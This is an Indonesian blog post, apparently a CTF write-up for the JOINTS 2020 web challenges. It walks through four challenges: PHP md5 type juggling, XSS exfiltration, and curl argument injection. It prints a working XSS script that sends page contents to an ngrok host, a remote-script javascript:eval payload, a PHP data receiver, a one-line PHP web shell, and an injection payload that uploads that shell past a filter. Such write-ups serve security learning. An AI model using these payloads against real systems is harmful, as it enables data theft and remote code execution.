@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>[JOINTS2020] Writeup Category Web | bl33dz:~#</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="[JOINTS2020] Writeup Category Web" />
+<meta name="author" content="bl33dz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Writeup Penyisihan JOINTS 2020 Category Web" />
+<meta property="og:description" content="Writeup Penyisihan JOINTS 2020 Category Web" />
+<link rel="canonical" href="http://bl33dz.github.io/2020/05/04/web-joints.html" />
+<meta property="og:url" content="http://bl33dz.github.io/2020/05/04/web-joints.html" />
+<meta property="og:site_name" content="bl33dz:~#" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-05-04T00:00:00+07:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"[JOINTS2020] Writeup Category Web","dateModified":"2020-05-04T00:00:00+07:00","datePublished":"2020-05-04T00:00:00+07:00","url":"http://bl33dz.github.io/2020/05/04/web-joints.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://bl33dz.github.io/2020/05/04/web-joints.html"},"author":{"@type":"Person","name":"bl33dz"},"description":"Writeup Penyisihan JOINTS 2020 Category Web","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/old/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/old/assets/favicon.png" />
+  <link type="application/atom+xml" rel="alternate" href="https://bl33dz.github.io/feed.xml" title="bl33dz:~#" />
+</head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/old/">bl33dz:~#<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://www.facebook.com/bl33dz"><i class="fab fa-facebook-square"></i></a><a class="color-purple-hover" href="https://github.com/bl33dz"><i class="fab fa-github-square"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <div class="author-box">
+<img src="https://s.gravatar.com/avatar/2c42898e592207a08fefe63c6231c78a?s=256" class="author-avatar" />
+bl33dz<br> ordinary people<br> interested in linux and programming
+
+</div>
+
+<div class="post">
+  <h1 class="post-title">[JOINTS2020] Writeup Category Web</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/old/tag/ctf/">ctf</a>
+      
+      <a class="tag" href="/old/tag/web/">web</a>
+      
+      <a class="tag" href="/old/tag/xss/">xss</a>
+      
+      <a class="tag" href="/old/tag/rce/">rce</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 04 May 2020</div>
+  
+  <div class="post-description">Writeup Penyisihan JOINTS 2020 Category Web</div>
+  
+  <p>Setelah beberapa <del>abad</del> bulan ga nulis, tiba tiba ada rasa pengen nulis blog ini lagi (efek kurang kerjaan kali). Nah, kebetulan kemaren saya mengikuti kompetisi CTF pada acara JOINTS 2020 yang diselenggarakan oleh Himpunan Mahasiswa Ilmu Komputer Universitas Gadjah Mada.</p>
+
+<p>Karena ternyata bisa nyelesain semua soal category web (<del>sombong dikit</del>), akhirnya jadilah artikel ke tiga pada blog ini. Berikut adalah daftar challenge category web pada CTF JOINTS 2020.</p>
+
+<h2 id="ezstringmatching">ezStringMatching</h2>
+
+<p>Diberikan sebuah website beralamatkan (http://ctf.joints.id:40002/) dan ketika saya lihat source web tersebut tidak ada yang mencurigakan. Maka saya mencoba melihat header dari website tersebut.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/web# curl -I http://ctf.joints.id:40002/
+HTTP/1.1 200 OK
+Host: ctf.joints.id:40002
+Date: Sun, 03 May 2020 18:31:31 GMT
+Connection: close
+X-Powered-By: PHP/7.2.30
+Debug: ?debug=v
+Content-type: text/html; charset=UTF-8
+</code></pre></div></div>
+
+<p>Dalam header tersebut terdapat parameter untuk melakukan debug pada web tersebut dan ketika saya melakukan debug saya mendapatkan source code web tersebut.</p>
+
+<p><img src="/assets/images/ezstring1.png" alt="ezstring1" /></p>
+
+<p>Dari source code diatas saya menyimpulkan untuk mendapatkan kita harus memiliki string yang berbeda namun memiliki hash md5 yang sama. Ketika saya mencari referensi di google saya menemukan link berikut ini (<a href="https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/PHP%20juggling%20type">github</a>).</p>
+
+<p>Maka ketika saya inputkan <code class="highlighter-rouge">240610708</code> pada String 1 dan <code class="highlighter-rouge">QNKCDZO</code> pada String 2 flag dari challenge ini akan ditampilkan.</p>
+
+<p><img src="/assets/images/ezstring2.png" alt="ezstring2" /></p>
+
+<p>Flag: <code class="highlighter-rouge">JOINTS20{b4by_typ3_ju99lin9_md5_}</code></p>
+
+<h2 id="under-construction">Under Construction</h2>
+
+<p>Diberikan sebuah website beralamatkan (http://ctf.joints.id:20002/) ketika dibuka website tersebut menampilkan login page, dan karena terdapat page register maka saya langsung register dan melakukan login.</p>
+
+<p><img src="/assets/images/under1.png" alt="under1" /></p>
+
+<p>Lalu saya mencoba melihat bagian fitur feedback dan mendapati bahwa fitur tersebut memiliki bug xss setelah mencoba memasukkan payload xsshunter pada fitur tersebut.</p>
+
+<p><img src="/assets/images/under3.png" alt="under3" /></p>
+
+<p><img src="/assets/images/under2.png" alt="under2" /></p>
+
+<p>Namun sayangnya saya tidak mendapatkan cookies dari user admin tersebut, maka dari itu saya mencoba membuat script xss sendiri untuk mengambil flag dari web tersebut</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function get_output(uri) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == XMLHttpRequest.DONE) {
+            send_output(xhr.responseText);
+        }
+    }
+    xhr.open('GET', uri, true);
+    xhr.send(null);
+}
+
+function send_output(data) {
+    var url = 'http://3d4b1f3c.ngrok.io/x.php';
+    var xhr = new XMLHttpRequest();
+    xhr.open( "POST", url, true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send("body="+encodeURI(data));
+    return xhr.responseText;
+}
+
+get_output("/flag");
+</code></pre></div></div>
+
+<p>Lalu saya juga membuat file PHP baru untuk melakukan listening agar dapat menerima output yang dikirim dari xss tersebut.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'body'</span><span class="p">];</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"output.txt"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Setelah itu saya save kedua file diatas pada localhost dan melakukan port forwarding menggunakan ngrok. Lalu saya mengeksekusi code yang saya buat pada bagian feedback.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javascript:eval('var a=document.createElement(\'script\');a.src=\'http://3d4b1f3c.ngrok.io/x.js\';document.body.appendChild(a)')
+</code></pre></div></div>
+
+<p><img src="/assets/images/under4.png" alt="under4" /></p>
+
+<p>Dari screenshot diatas membuktikan bahwa terdapat request dari victim ke localhost saya. Saya pun mencoba melihat result dari <code class="highlighter-rouge">output.txt</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/xss# cat output.txt | grep JOINTS
+YOUR TREASURE : JOINTS20{Cust0m_R3diRecT_For_TH3_w1n}
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">JOINTS20{Cust0m_R3diRecT_For_TH3_w1n}</code></p>
+
+<h2 id="l333t">l333t</h2>
+
+<p>Diberikan sebuah website (http://ctf.joints.id:1337/) hampir mirip dengan web pertama, saya melakukan register dan login. Lalu mendapati tampilan seperti dibawah.</p>
+
+<p><img src="/assets/images/l333t1.png" alt="l333t1" /></p>
+
+<p>Lalu saya mencoba melakukan xss pada bagian submit dan ternyata memiliki celah xss yang sama dengan challenge <code class="highlighter-rouge">Under Construction</code>.</p>
+
+<p><img src="/assets/images/l333t2.png" alt="l333t2" /></p>
+
+<p><img src="/assets/images/l333t3.png" alt="l333t3" /></p>
+
+<p>Dan boom, tampilannya ternyata sama persis dengan web sebelumnya, maka dari itu saya mencoba melakukan trik yang sama dengan web sebelumnya. Saya menggunakan script js yang sama seperti sebelumnya.</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function get_output(uri) {
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange = function() {
+        if (xhr.readyState == XMLHttpRequest.DONE) {
+            send_output(xhr.responseText);
+        }
+    }
+    xhr.open('GET', uri, true);
+    xhr.send(null);
+}
+
+function send_output(data) {
+    var url = 'http://3d4b1f3c.ngrok.io/x.php';
+    var xhr = new XMLHttpRequest();
+    xhr.open( "POST", url, true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send("body="+encodeURI(data));
+    return xhr.responseText;
+}
+
+get_output("/flag");
+</code></pre></div></div>
+
+<p>Lalu saya juga menggunakan file PHP yang sebelumnya untuk melakukan listening agar dapat menerima output yang dikirim dari xss tersebut.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">'body'</span><span class="p">];</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"output.txt"</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Setelah itu saya save kedua file diatas pada localhost dan melakukan port forwarding menggunakan ngrok. Lalu saya mengeksekusi code yang saya buat pada bagian submit.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>javascript:eval('var a=document.createElement(\'script\');a.src=\'http://3d4b1f3c.ngrok.io/x.js\';document.body.appendChild(a)')
+</code></pre></div></div>
+
+<p><img src="/assets/images/l333t4.png" alt="l333t4" /></p>
+
+<p>Dan setelah itu saya cek lagi file outputnya dan ternyata muncul flag yang baru.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/xss# cat output.txt | grep JOINTS
+Here you go admin : JOINTS20{L333T_k1dz_Pl4y_with_CrLF_and_CORS_31337}
+</code></pre></div></div>
+
+<p>Flag: <code class="highlighter-rouge">JOINTS20{L333T_k1dz_Pl4y_with_CrLF_and_CORS_31337}</code></p>
+
+<h2 id="twitter-collection">Twitter Collection</h2>
+
+<p>Diberikan sebuah website beralamat (http://ctf.joints.id:10001/), web tersebut berfungsi untuk mengambil gambar dari twitter dan menyimpannya pada server tersebut.</p>
+
+<p><img src="/assets/images/twitter1.png" alt="twitter1" /></p>
+
+<p>Ketika saya memasukkan gambar yang ada pada contoh website akan menampilkan seperti berikut.</p>
+
+<p><img src="/assets/images/twitter2.png" alt="twitter2" /></p>
+
+<p>Bisa dilihat terdapat gambar mona yang sangat cantik (tapi cantikan iofi), dan ketika diklik akan menuju pada lokasi asli gambar tersebut</p>
+
+<p><code class="highlighter-rouge">http://ctf.joints.id:10001/downloads/c941dc6d992361c4eccc99ffdbaaf98c3392200f/[namafile]</code></p>
+
+<p>Saya agak lupa lokasi file saya karena waktu mengerjakan soal ini, posisi saya sedang pada Ubuntu. Saya mencoba mendapatkan error dan melihat Inspect -&gt; Network lalu mendapatkan output seperti berikut.</p>
+
+<p><img src="/assets/images/twitter3.png" alt="twitter3" /></p>
+
+<p>Saya pun yakin bahwa ketika melakukan request ke url, web tersebut menggunakan curl namun dengan system,passthru,shell_exec atau sejenisnya. Saya lalu mencoba melakukan command injection dan ternyata terdapat banyak filter yang sangat menggangu.</p>
+
+<p>Akhirnya saya mendapat ide untuk menggunakan curl agar dapat mengupload web shell pada web tersebut. Untuk trik yang saya gunakan sebenarnya sederhana saya hanya perlu menambahkan url lain setelah url twitter dan menyimpannya pada server dengan option <code class="highlighter-rouge">-o</code> pada curl.</p>
+
+<p>Berikut script PHP yang saya buat.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">echo</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
+</code></pre></div></div>
+
+<p>Simpan file diatas dengan extensi <code class="highlighter-rouge">txt</code> dan taruh pada localhost lalu lakukan port forwarding. Berikut payload yang sudah ada dipikiran saya.</p>
+
+<p><code class="highlighter-rouge">https://pbs.twimg.com/" "http://3d4b1f3c.ngrok.io/x.txt" -o "x.php</code></p>
+
+<p>Nah disini ternyata saya juga mendapatkan error lagi karena ternyata string “php” terkena filter. Wahhh puasa puasa mempersulit orang lain. Lalu saya mencoba memperbaiki payload saya agar dapat melewati filter tersebut.</p>
+
+<p>Final Payload: <code class="highlighter-rouge">https://pbs.twimg.com/" "http://3d4b1f3c.ngrok.io/x.txt" -o "x.ph""p</code></p>
+
+<p>Dan boom, ternyata file saya sudah terupload dan terdapat pada bagian folder yang sama dengan gambar diatas tadi</p>
+
+<p><code class="highlighter-rouge">http://ctf.joints.id:10001/downloads/c941dc6d992361c4eccc99ffdbaaf98c3392200f/x.php</code></p>
+
+<p>Maka saya hanya perlu mencari lokasi flag dengan webshell diatas.</p>
+
+<p><img src="/assets/images/twitter4.png" alt="twitter4" /></p>
+
+<p>Flag: <code class="highlighter-rouge">JOINTS20{ya_benar_ini_benderanya_uwu}</code></p>
+
+<p>Sekian writeup yang bisa saya tulis, mohon maaf kalau tulisannya jelek soalnya tadi dikejar deadline pengumpulan writeup (mager juga suruh baca ulang). Dan jikalau saya ada salah kata mohon maaf.</p>
+
+<p>Sampai ketemu di next artikel.</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/old/2020/05/20/vulnhub-typo1.html">
+            [VULNHUB] Typo: 1
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/old/2020/05/05/hackthebox-bitlab.html">
+            [HTB] Bitlab
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/old/2019/12/07/hackthebox-wall.html">
+            [HTB] Wall
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/old/tag/ctf/" class="set-1">ctf</a> <a href="/old/tag/easy/" class="set-1">easy</a> <a href="/old/tag/hackthebox/" class="set-2">hackthebox</a> <a href="/old/tag/linux/" class="set-5">linux</a> <a href="/old/tag/medium/" class="set-4">medium</a> <a href="/old/tag/rce/" class="set-1">rce</a> <a href="/old/tag/vulnhub/" class="set-2">vulnhub</a> <a href="/old/tag/web/" class="set-1">web</a> <a href="/old/tag/xss/" class="set-1">xss</a></div>
+  
+
+
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+  	<center><a href="https://www.hackthebox.eu/home/users/profile/67190"><img src="https://www.hackthebox.eu/badge/image/67190" alt="Hack The Box"></a></center><br><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+if (theme === 'undefined') {
+   theme = "dark";
+}
+if (theme === "dark") {
+	document.documentElement.setAttribute('data-theme', 'dark');
+} else {
+    document.documentElement.setAttribute('data-theme', 'light');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
